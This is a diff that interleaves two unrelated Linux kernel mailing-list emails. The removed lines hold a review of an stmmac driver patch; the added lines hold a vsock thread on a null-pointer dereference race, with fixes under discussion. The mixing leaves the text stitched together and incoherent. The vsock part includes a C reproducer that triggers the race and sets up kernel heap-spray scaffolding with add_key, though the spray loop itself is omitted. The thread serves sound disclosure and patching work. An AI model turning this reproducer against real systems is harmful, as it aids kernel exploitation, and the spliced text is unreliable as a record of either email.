-X-MS-Exchange-CrossTenant-UserPrincipalName: WBZVOV4Nq52D6YFUP1qo4X8n2JDhHNVF0K2pbTzfvkk8pyfi4hBg5ieD6LF8XWnWcU6VGyxR2awy+Uj4zO8Ie4O7l9nNREaakB8x/hErNX8=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: MW5PR11MB5882
-X-OriginatorOrg: intel.com
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
 
-From: Furong Xu <0x1207@gmail.com>
-Date: Wed, 18 Dec 2024 16:34:07 +0800
-
-> After commit 2af6106ae949 ("net: stmmac: Introducing support for Page
-> Pool"), the driver always copies frames to get a better performance,
-> zero-copy for RX frames is no more, then these code turned to be
-> useless and users of ethtool may get confused about the unhandled
-> rx-copybreak parameter.
+On Wed, Dec 18, 2024 at 04:31:03PM +0100, Stefano Garzarella wrote:
+> On Wed, Dec 18, 2024 at 03:40:40PM +0100, Stefano Garzarella wrote:
+> > On Wed, Dec 18, 2024 at 09:19:08AM -0500, Hyunwoo Kim wrote:
+> > > On Wed, Dec 18, 2024 at 02:40:49PM +0100, Stefano Garzarella wrote:
+> > > > On Wed, Dec 18, 2024 at 07:25:07AM -0500, Hyunwoo Kim wrote:
+> > > > > When calling connect to change the CID of a vsock, the loopback
+> > > > > worker for the VIRTIO_VSOCK_OP_RST command is invoked.
+> > > > > During this process, vsock_stream_has_data() calls
+> > > > > vsk->transport->stream_has_data().
+> > > > > However, a null-ptr-deref occurs because vsk->transport was set
+> > > > > to NULL in vsock_deassign_transport().
+> > > > > 
+> > > > >                     cpu0                                                      cpu1
+> > > > > 
+> > > > >                                                               socket(A)
+> > > > > 
+> > > > >                                                               bind(A, VMADDR_CID_LOCAL)
+> > > > >                                                                 vsock_bind()
+> > > > > 
+> > > > >                                                               listen(A)
+> > > > >                                                                 vsock_listen()
+> > > > >  socket(B)
+> > > > > 
+> > > > >  connect(B, VMADDR_CID_LOCAL)
+> > > > > 
+> > > > >  connect(B, VMADDR_CID_HYPERVISOR)
+> > > > >    vsock_connect(B)
+> > > > >      lock_sock(sk);
 > 
-> This patch mostly reverts
-> commit 22ad38381547 ("stmmac: do not perform zero-copy for rx frames")
+> It shouldn't go on here anyway, because there's this check in
+> vsock_connect():
 > 
-> Signed-off-by: Furong Xu <0x1207@gmail.com>
+> 	switch (sock->state) {
+> 	case SS_CONNECTED:
+> 		err = -EISCONN;
+> 		goto out;
 
-The patch itself is fine, *but*
+By using a kill signal, set sock->state to SS_UNCONNECTED and sk->sk_state to 
+TCP_CLOSING before the second connect() is called, causing the worker to 
+execute without the SOCK_DONE flag being set.
 
-> ---
->  drivers/net/ethernet/stmicro/stmmac/stmmac.h  |  2 -
->  .../ethernet/stmicro/stmmac/stmmac_ethtool.c  | 39 -------------------
->  .../net/ethernet/stmicro/stmmac/stmmac_main.c |  5 ---
->  3 files changed, 46 deletions(-)
 > 
-> diff --git a/drivers/net/ethernet/stmicro/stmmac/stmmac.h b/drivers/net/ethernet/stmicro/stmmac/stmmac.h
-> index 1d86439b8a14..b8d631e559c0 100644
-> --- a/drivers/net/ethernet/stmicro/stmmac/stmmac.h
-> +++ b/drivers/net/ethernet/stmicro/stmmac/stmmac.h
-> @@ -126,7 +126,6 @@ struct stmmac_rx_queue {
->  	unsigned int cur_rx;
->  	unsigned int dirty_rx;
->  	unsigned int buf_alloc_num;
-> -	u32 rx_zeroc_thresh;
->  	dma_addr_t dma_rx_phy;
+> 
+> Indeed if I try, I have this behaviour:
+> 
+> shell1# python3
+> import socket
+> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
+> s.bind((1,1234))
+> s.listen()
+> 
+> shell2# python3
+> import socket
+> s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
+> s.connect((1, 1234))
+> s.connect((2, 1234))
+> Traceback (most recent call last):
+>   File "<stdin>", line 1, in <module>
+> OSError: [Errno 106] Transport endpoint is already connected
+> 
+> 
+> Where 106 is exactly EISCONN.
+> So, do you have a better reproducer for that?
 
-If sizeof(dma_addr_t) == 8, you're clearly introducing a 4-byte hole
-here. Perhaps you could reshuffle the struct a bit to avoid this.
+The full scenario is as follows:
+```
+                     cpu0                                                      cpu1
 
-It's always good to inspect the .kos with pahole after modifying
-structures to make sure there are no regressions.
+                                                               socket(A)
 
->  	u32 rx_tail_addr;
->  	unsigned int state_saved;
+                                                               bind(A, {cid: VMADDR_CID_LOCAL, port: 1024})
+                                                                 vsock_bind()
 
-Thanks,
-Olek
+                                                               listen(A)
+                                                                 vsock_listen()
+  socket(B)
+
+  connect(B, {cid: VMADDR_CID_LOCAL, port: 1024})
+    vsock_connect()
+      lock_sock(sk);
+      virtio_transport_connect()
+        virtio_transport_connect()
+          virtio_transport_send_pkt_info()
+            vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_REQUEST)
+              queue_work(vsock_loopback_work)
+      sk->sk_state = TCP_SYN_SENT;
+      release_sock(sk);
+                                                               vsock_loopback_work()
+                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_REQUEST)
+                                                                   sk = vsock_find_bound_socket(&dst);
+                                                                   virtio_transport_recv_listen(sk, skb)
+                                                                     child = vsock_create_connected(sk);
+                                                                     vsock_assign_transport()
+                                                                       vvs = kzalloc(sizeof(*vvs), GFP_KERNEL);
+                                                                     vsock_insert_connected(vchild);
+                                                                       list_add(&vsk->connected_table, list);
+                                                                     virtio_transport_send_response(vchild, skb);
+                                                                       virtio_transport_send_pkt_info()
+                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RESPONSE)
+                                                                           queue_work(vsock_loopback_work)
+
+                                                               vsock_loopback_work()
+                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RESPONSE)
+                                                                   sk = vsock_find_bound_socket(&dst);
+                                                                   lock_sock(sk);
+                                                                   case TCP_SYN_SENT:
+                                                                   virtio_transport_recv_connecting()
+                                                                     sk->sk_state = TCP_ESTABLISHED;
+                                                                   release_sock(sk);
+
+                                                               kill(connect(B));
+      lock_sock(sk);
+      if (signal_pending(current)) {
+      sk->sk_state = sk->sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
+      sock->state = SS_UNCONNECTED;
+      release_sock(sk);
+
+  connect(B, {cid: VMADDR_CID_HYPERVISOR, port: 1024})
+    vsock_connect(B)
+      lock_sock(sk);
+      vsock_assign_transport()
+        virtio_transport_release()
+          virtio_transport_close()
+            if (!(sk->sk_state == TCP_ESTABLISHED || sk->sk_state == TCP_CLOSING))
+            virtio_transport_shutdown()
+              virtio_transport_send_pkt_info()
+                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
+                  queue_work(vsock_loopback_work)
+        vsock_deassign_transport()
+          vsk->transport = NULL;
+        return -ESOCKTNOSUPPORT;
+      release_sock(sk);
+                                                               vsock_loopback_work()
+                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
+                                                                   virtio_transport_recv_connected()
+                                                                     virtio_transport_reset()
+                                                                       virtio_transport_send_pkt_info()
+                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
+                                                                           queue_work(vsock_loopback_work)
+
+                                                               vsock_loopback_work()
+                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
+								   virtio_transport_recv_disconnecting()
+								     virtio_transport_do_close()
+								       vsock_stream_has_data()
+								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
+```
+
+And the reproducer I used is as follows, but since it’s a race condition, 
+triggering it might take a long time depending on the environment. 
+Therefore, it’s a good idea to add an mdelay to the appropriate vsock function:
+```
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <linux/vm_sockets.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <fcntl.h>
+#include <syscall.h>
+#include <stdarg.h>
+#include <sched.h>
+#include <signal.h>
+#include <time.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/times.h>
+#include <sys/timerfd.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <stddef.h>
+#include <linux/types.h>
+#include <stdint.h>
+#include <linux/keyctl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <syscall.h>
+#include <stdarg.h>
+#include <sched.h>
+#include <signal.h>
+#include <time.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/times.h>
+#include <sys/timerfd.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <stddef.h>
+
+#define FAIL_IF(x) if ((x)) { \
+        perror(#x); \
+        return -1; \
+}
+#define SPRAY_ERROR 0
+#define SPRAY_RETRY 1
+#define SPRAY_SUCCESS 2
+
+#define LAST_RESERVED_PORT 1023
+
+#define NS_PER_JIFFIE 1000000ull
+
+int cid_port_num = LAST_RESERVED_PORT;
+
+void *trigger_stack = NULL;
+void *heap_spray_stack = NULL;
+volatile int status_spray = SPRAY_ERROR;
+
+struct virtio_vsock_sock {
+	void *vsk;
+	int tx_lock;
+	int rx_lock;
+	int tx_cnt;
+	int peer_fwd_cnt;
+	int peer_buf_alloc;
+	int fwd_cnt;
+	int last_fwd_cnt;
+	int rx_bytes;
+	int buf_alloc;
+	char pad[4];
+	char rx_queue[24];
+	int msg_count;
+};
+_Static_assert(sizeof(struct virtio_vsock_sock) == 80, "virtio_vsock_sock size missmatch");
+
+union key_payload {
+        struct virtio_vsock_sock vvs;
+        struct {
+                char header[24];
+                char data[];
+        } key;
+};
+
+#define MAIN_CPU 0
+#define HELPER_CPU 1
+
+inline static int _pin_to_cpu(int id)
+{
+        cpu_set_t set;
+        CPU_ZERO(&set);
+        CPU_SET(id, &set);
+        return sched_setaffinity(getpid(), sizeof(set), &set);
+}
+
+typedef int key_serial_t;
+
+inline static key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
+{
+	return syscall(__NR_add_key, type, description, payload, plen, ringid);
+}
+
+long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
+{
+	return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
+}
+
+unsigned long long get_jiffies()
+{
+	return times(NULL) * 10;
+}
+
+int race_trigger(void *arg)
+{
+	struct sockaddr_vm connect_addr = {0};
+	struct sockaddr_vm listen_addr = {0};
+	pid_t conn_pid, listen_pid;
+
+	int socket_a = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
+	int socket_b = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
+
+	cid_port_num++;
+
+	connect_addr.svm_family = AF_VSOCK;
+	connect_addr.svm_cid = VMADDR_CID_LOCAL;
+	connect_addr.svm_port = cid_port_num;
+
+	listen_addr.svm_family = AF_VSOCK;
+	listen_addr.svm_cid = VMADDR_CID_LOCAL;
+	listen_addr.svm_port = cid_port_num;
+	bind(socket_a, (struct sockaddr *)&listen_addr, sizeof(listen_addr));
+
+	listen(socket_a, 0);
+
+	_pin_to_cpu(MAIN_CPU);
+
+	conn_pid = fork();
+	if (conn_pid == 0) {
+		/*
+		struct itimerspec it = {};
+		int tfd;
+
+		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
+		unsigned long tmp;
+		it.it_value.tv_sec = 0;
+		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
+		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);
+
+		read(tfd, &tmp, sizeof(tmp));
+		*/
+
+		connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
+	} else {
+		/*
+		struct itimerspec it = {};
+		int tfd;
+
+		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
+		unsigned long tmp;
+		it.it_value.tv_sec = 0;
+		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
+		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);
+
+		read(tfd, &tmp, sizeof(tmp));
+		*/
+
+		kill(conn_pid, SIGKILL);
+		wait(NULL);
+	}
+
+	connect_addr.svm_cid = 0;
+	connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
+
+	return 0;
+}
+
+int heap_spraying(void *arg)
+{
+	union key_payload payload = {};
+	union key_payload readout = {};
+	key_serial_t keys[256] = {};
+
+	status_spray = SPRAY_ERROR;
+
+	int race_trigger_pid = clone(race_trigger, trigger_stack, CLONE_VM | SIGCHLD, NULL);
+	FAIL_IF(race_trigger_pid < 0);
+
+	const size_t payload_size = sizeof(payload.vvs) - sizeof(payload.key.header);
+	memset(&payload, '?', sizeof(payload));
+
+	_pin_to_cpu(MAIN_CPU);
+
+	unsigned long long begin = get_jiffies();
+	do {
+		// ...
+	} while (get_jiffies() - begin < 25);
+
+	status_spray = SPRAY_RETRY;
+
+	return 0;
+}
+
+int main()
+{
+	srand(time(NULL));
+
+	trigger_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+	FAIL_IF(trigger_stack == MAP_FAILED);
+	trigger_stack += 0x8000;
+	heap_spray_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+	FAIL_IF(heap_spray_stack == MAP_FAILED);
+	heap_spray_stack += 0x8000;
+
+	do {
+		int spray_worker_pid = clone(heap_spraying, heap_spray_stack, CLONE_VM | SIGCHLD, NULL);
+		FAIL_IF(spray_worker_pid < 0);
+		FAIL_IF(waitpid(spray_worker_pid, NULL, 0) < 0);
+	} while (status_spray == SPRAY_RETRY);
+
+	return 0;
+}
+```
+
+> 
+> Would be nice to add a test in tools/testing/vsock/vsock_test.c
+> 
+> Thanks,
+> Stefano
+> 
+> > > > >      vsock_assign_transport()
+> > > > >        virtio_transport_release()
+> > > > >          virtio_transport_close()
+> > > > >            virtio_transport_shutdown()
+> > > > >              virtio_transport_send_pkt_info()
+> > > > >                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
+> > > > >                  queue_work(vsock_loopback_work)
+> > > > >        vsock_deassign_transport()
+> > > > >          vsk->transport = NULL;
+> > > > >                                                               vsock_loopback_work()
+> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
+> > > > >                                                                   virtio_transport_recv_connected()
+> > > > >                                                                     virtio_transport_reset()
+> > > > >                                                                       virtio_transport_send_pkt_info()
+> > > > >                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
+> > > > >                                                                           queue_work(vsock_loopback_work)
+> > > > > 
+> > > > >                                                               vsock_loopback_work()
+> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
+> > > > > 								   virtio_transport_recv_disconnecting()
+> > > > > 								     virtio_transport_do_close()
+> > > > > 								       vsock_stream_has_data()
+> > > > > 								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
+> > > > > 
+> > > > > To resolve this issue, add a check for vsk->transport, similar to
+> > > > > functions like vsock_send_shutdown().
+> > > > > 
+> > > > > Fixes: fe502c4a38d9 ("vsock: add 'transport' member in the struct vsock_sock")
+> > > > > Signed-off-by: Hyunwoo Kim <v4bel@theori.io>
+> > > > > Signed-off-by: Wongi Lee <qwerty@theori.io>
+> > > > > ---
+> > > > > net/vmw_vsock/af_vsock.c | 3 +++
+> > > > > 1 file changed, 3 insertions(+)
+> > > > > 
+> > > > > diff --git a/net/vmw_vsock/af_vsock.c b/net/vmw_vsock/af_vsock.c
+> > > > > index 5cf8109f672a..a0c008626798 100644
+> > > > > --- a/net/vmw_vsock/af_vsock.c
+> > > > > +++ b/net/vmw_vsock/af_vsock.c
+> > > > > @@ -870,6 +870,9 @@ EXPORT_SYMBOL_GPL(vsock_create_connected);
+> > > > > 
+> > > > > s64 vsock_stream_has_data(struct vsock_sock *vsk)
+> > > > > {
+> > > > > +	if (!vsk->transport)
+> > > > > +		return 0;
+> > > > > +
+> > > > 
+> > > > I understand that this alleviates the problem, but IMO it is not the right
+> > > > solution. We should understand why we're still processing the packet in the
+> > > > context of this socket if it's no longer assigned to the right transport.
+> > > 
+> > > Got it. I agree with you.
+> > > 
+> > > > 
+> > > > Maybe we can try to improve virtio_transport_recv_pkt() and check if the
+> > > > vsk->transport is what we expect, I mean something like this (untested):
+> > > > 
+> > > > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
+> > > > index 9acc13ab3f82..18b91149a62e 100644
+> > > > --- a/net/vmw_vsock/virtio_transport_common.c
+> > > > +++ b/net/vmw_vsock/virtio_transport_common.c
+> > > > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
+> > > > 
+> > > >        lock_sock(sk);
+> > > > 
+> > > > -       /* Check if sk has been closed before lock_sock */
+> > > > -       if (sock_flag(sk, SOCK_DONE)) {
+> > > > +       /* Check if sk has been closed or assigned to another transport before
+> > > > +        * lock_sock
+> > > > +        */
+> > > > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != t) {
+> > > >                (void)virtio_transport_reset_no_sock(t, skb);
+> > > >                release_sock(sk);
+> > > >                sock_put(sk);
+> > > > 
+> > > > BTW I'm not sure it is the best solution, we have to check that we do not
+> > > > introduce strange cases, but IMHO we have to solve the problem earlier in
+> > > > virtio_transport_recv_pkt().
+> > > 
+> > > At least for vsock_loopback.c, this change doesn’t seem to introduce any
+> > > particular issues.
+> > 
+> > But was it working for you? because the check was wrong, this one should
+> > work, but still, I didn't have time to test it properly, I'll do later.
+> > 
+> > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
+> > index 9acc13ab3f82..ddecf6e430d6 100644
+> > --- a/net/vmw_vsock/virtio_transport_common.c
+> > +++ b/net/vmw_vsock/virtio_transport_common.c
+> > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
+> >        lock_sock(sk);
+> > -       /* Check if sk has been closed before lock_sock */
+> > -       if (sock_flag(sk, SOCK_DONE)) {
+> > +       /* Check if sk has been closed or assigned to another transport before
+> > +        * lock_sock
+> > +        */
+> > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != &t->transport) {
+> >                (void)virtio_transport_reset_no_sock(t, skb);
+> >                release_sock(sk);
+> >                sock_put(sk);
+> > 
+> > > 
+> > > And separately, I think applying the vsock_stream_has_data patch would help
+> > > prevent potential issues that could arise when vsock_stream_has_data is
+> > > called somewhere.
+> > 
+> > Not sure, with that check, we wouldn't have seen this problem we had, so
+> > either add an error, but mute it like this I don't think is a good idea,
+> > also because the same function is used in a hot path, so an extra check
+> > could affect performance (not much honestly in this case, but adding it
+> > anywhere could).
+> > 
+> > Thanks,
+> > Stefano
+> > 
+> > > 
+> > > > 
+> > > > Thanks,
+> > > > Stefano
+> > > > 
+> > > > > 	return vsk->transport->stream_has_data(vsk);
+> > > > > }
+> > > > > EXPORT_SYMBOL_GPL(vsock_stream_has_data);
+> > > > > --
+> > > > > 2.34.1
+> > > > > 
+> > > > 
+> > > 
+> 
 
